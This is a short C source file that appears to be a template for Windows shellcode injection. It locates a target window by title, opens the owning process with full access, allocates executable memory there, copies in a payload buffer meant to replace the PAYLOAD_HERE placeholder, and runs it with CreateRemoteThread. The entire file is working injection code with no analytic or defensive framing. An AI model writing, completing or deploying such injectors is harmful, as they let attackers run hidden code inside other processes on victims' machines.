#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

PAYLOAD_HERE

int main() {

  HANDLE ph;
  HANDLE rt;
  DWORD pid;

  // find a window for mspaint.exe
  HWND hw = FindWindow(NULL, (LPCSTR) "WINDOW_HERE");
  if (hw == NULL) {
    printf("failed to find window :(\n");
    return -2;
  }
  GetWindowThreadProcessId(hw, &pid);
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

  LPVOID rb = VirtualAllocEx(ph, NULL, sizeof(buf), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(ph, rb, buf, sizeof(buf), NULL);

  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
  CloseHandle(ph);

  return 0;
}